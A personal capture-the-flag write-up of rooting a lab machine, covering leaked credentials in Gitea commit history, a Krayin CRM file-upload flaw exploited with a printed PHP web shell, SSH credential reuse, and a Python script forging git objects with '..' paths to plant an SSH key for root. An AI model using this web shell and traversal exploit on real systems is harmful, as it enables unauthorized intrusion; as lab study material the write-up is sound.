
Given the IP address I am tasked by myself to try and penetrate the target

### Enumeration

First I use Nmap for port enumeration
![[Pasted image 20260720204135.png]]
- the scan shows the port 22 open for ssh and port 80 open for http which likely hosts a webserver

### Webserver

The webserver contains a website about renewable energy 
![[Pasted image 20260720204434.png]]
- We do not get many info or anything useful from the website at the first glance
- Continuing to look through it I found a job application on the main page in which I can get the email of the hiring manager `j.matthew@nexus.htb` which later could be useful
![[Pasted image 20260720204717.png]]

Since I don't get anything else valuable I decide to do some fuzzing for virtual host or hidden directories or files

One scan was successful that being the virtual host scan which returned with a new subdomain `git`
```bash
ffuf -u hhttp://nexus.htb -H 'Host: FUZZ.nexus.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 150 -ic -fc 302 
```
![[Pasted image 20260720205332.png]]

Checking the `git.nexus.htb` website I am met with a Gitea website which most likely holds a repo holding something valuable
- I also learn that there are 2 users present on the website: `jones` and `admin`
![[Pasted image 20260720210331.png]]
- There is a repo indeed `krayin-docker-setup` owned by the `admin` user
![[Pasted image 20260720210443.png]]
- Through the 3 files present in the repo the interesting one is the `.env` 
- The files holds the next info that could be useful:
	- A new subdomain `billing.nexus.htb` which hosts a `Krayin CRM` app 
![[Pasted image 20260720211126.png]]
- a DB present but for credentials only the username is present:
![[Pasted image 20260720211157.png]]

One thing I completely missed was that this repo has 2 commits so it is possible that some data was different before
![[Pasted image 20260720211512.png]]

Checking the newer commit to see what was modified I found that the `.env` file contains the changes, these 2 being the subdomain that was changed and also there was a password left there before:
![[Pasted image 20260720211735.png]]
- The password `N27xh!!2ucY04` is for the DB for sure will help later on

I tried to connect to the Gitea repo of jones with the password I found but no luck in doing that, I also tried to connect to the admin user but no luck in that either

Now that I think the Gitea repo has been fully searched I can move on to the next part

Next step is to check the `billings.nexus.htb` website which holds the `Krayin CRM` and maybe I have the luck to find some vulnerabilities there
![[Pasted image 20260721123148.png]]
- The page leads me to a login page so since there is an email and password required i made the choice to use the following credentials:
	- email: `j.matthew@nexus.htb`
	- password: `N27xh!!2ucY04`
- The login is successful and redirects me to the dashboard as the `james` user

The most common thing to look up when you encounter software like this is the version and then check if there are any discovered vulnerabilities and also exploits
- The version can be found by clicking the user profile in the top right corner
![[Pasted image 20260721124626.png]]
- The version is `2.2.0` 

A quick search on Google reveal that there is indeed a vulnerability that leads to file upload that can lead to full RCE on the server
- The vulnerability is the [CVE-2026-38526](https://nvd.nist.gov/vuln/detail/CVE-2026-38526) and more information can be found here https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md 
- The exploit can be replicated as this:
	1. Log in to the `Krayin CRM` with any valid user and capture the session token
	2. Send a POST request to `admin/tinymce/upload` with a php file (reverse shell/web shell script, etc.) as the attachment 
	3. retrieve the upload path that will be returned by the server 
	4. send a GET request to the uploaded file path and the script will get executed
- A working PoC can be found here https://www.exploit-db.com/exploits/52629 as well

To exploit the vulnerability first I need some sort of shell, so with a search on google I found a simple php web shell:
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
	if(isset($_GET['cmd']))
	{ system ($_GET['cmd'] . ' 2>&1'); }
?>
</pre>
</body>
</html> 
```

Then I use the PoC and let's see if it works
```bash
python3 ./CVE-2026-38526.py -t http://billing.nexus.htb -u j.matthew@nexus.htb -p "N27xh\!\!2ucY04" -f ./shell.php
```
![[Pasted image 20260721131631.png]]

Checking the uploaded file path I found the web shell there and with the command `id` I found that the web shell is runs under the `www-data` user
![[Pasted image 20260721131950.png]]

### Foothold

First thing to do is to see my current location with the command `pwd` which tells me I am inside the `/var/www/krayin/storage/app/public/tinymce`

First thing is to check the app directory for interesting files like: config files, environment settings, databases, etc.
- A quick search on Google tells me that the environment settings can be found in the .env file in the root directory of the app, for our case that would be `/var/www/krayin/.env`
- This worked and it gave some valuable insight on the app settings, but the most interesting piece of info is the `DB_password` which seems to be different than the one present in the `.env` file inside the Gitea repo from before
![[Pasted image 20260721134228.png]]
- The new password is `y27xb3ha!!74GbR` and it could help us log in into another user account

To find potential user targets I use the `ls -la /home` command to check what users have a folders present there (usually one of the user present there holds the user flag)
- The output shows 2 potential users: `git` and `jones`
- Since `git` is most likely the user who is in charge with the Gitea website and the user `jones` was among the 2 user present on Gitea, my guess is that `jones` is the one holding the flag

I then try to ssh into the `john` user with the credential:
- username: `john`
- password: `y27xb3ha!!74GbR`
![[Pasted image 20260721135040.png]]
- The attempt worked and it gave me access inside the system and also the flag

### System Flag

The system flag is kinda tricky to get it at first guess, as after several methods I didn't find anything but with a little help I figured out to check the system timers for active jobs that run periodically
```bash
systemctl list-timers
```
![[Pasted image 20260721141532.png]]
- The output shows a timer `gitea-template-sync.timer` which definitely looks suspicious and also the timer runs every minute (summing up LEFT + PASSED cols) 
- Now let's see what actually runs every minute
![[Pasted image 20260721142124.png]]
- The script ran every minute is a python script found at `/etc/gitea/template-sync.py` 

The script is large but in short it does the following:
- Gets all repos that run as a template and syncs their file contents to `/home/git/template-staging/<owner>/<repo>`
- The vulnerability is done at how the script processes file paths from `git ls-tree`
![[Pasted image 20260721145814.png]]
- there is no input sanitization present which can lead to directory traversal
- `git ls-tree` outputs paths containing `..` without validation and `os.path.join()` resolves them we can write files everywhere the owner has access
- Since the staging directory is at `/home/git/template-staging/<owner>/<repo>` we need `../../../../../` to reach `/root` and after that the easiest thing to do is to write an SSH key to `.ssh/authorized_keys`

### Directory Traversal

1. First we go to the `jones` Gitea account and log in with his credentials we use to log in through ssh
2. We create a new repository with the name `rce` and we select `Make repository a template`
![[Pasted image 20260721150631.png]]
3. Because git prevents creating files with `..` in the path we can bypass this by writing objects directly to `.git/objects/` 
4. Next we clone the repo locally on our machine 
```bash
cd /tmp
git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/rce.git
cd rce
touch README.md
```
5. I will use the following script to write to the `/objects` folder 
```python
#!/usr/bin/env python3
import hashlib,zlib,os,subprocess,sys,time

def write_obj(data,t):
	h=("%s %d"%(t,len(data))).encode()+b"\x00"
	s=h+data
	sha=hashlib.sha1(s).hexdigest()
	d=os.path.join(".git","objects",sha[:2])
	os.makedirs(d,exist_ok=True)
	p=os.path.join(d,sha[2:])
	if not os.path.exists(p):
		open(p,"wb").write(zlib.compress(s))
	return sha
	
def entry(mode,name,sha):
	return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)

if not os.path.isdir(".git"):
	print("Run inside git repo");sys.exit(1)

r=subprocess.run(["cat","/tmp/key.pub"],capture_output=True,text=True)
if r.returncode!=0:
	print("ssh-keygen -t ed25519 -f /tmp/key -N ''");sys.exit(1)

key=r.stdout.strip()+"\n"
blob=write_obj(key.encode(),"blob")
readme=write_obj(b"# Template\n","blob")
ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
fir=write_obj(entry("40000","root",cur),"tree")

for i in range(4):
	fir=write_obj(entry("40000","..",fir),"tree")

root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
ts=int(time.time())
c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
sha=write_obj(c.encode(),"commit")
os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
print("Done: "+sha)
```
6. Before running the script we have to create the key:
```bash
ssh-keygen -t ed25519 -f /tmp/key -N ''
```
7. Now we run the script and then push to the repo:
```bash
python3 /tmp/script.py
git push -u origin main --force
```
8. We wait for 1 minute and then we can try to ssh to the root user with our key
```bash
ssh -i /tmp/key root@nexus.htb
```

Everything worked flawless and now I've got access to the entire system and I can retrieve the system flag
![[Pasted image 20260721152159.png]]
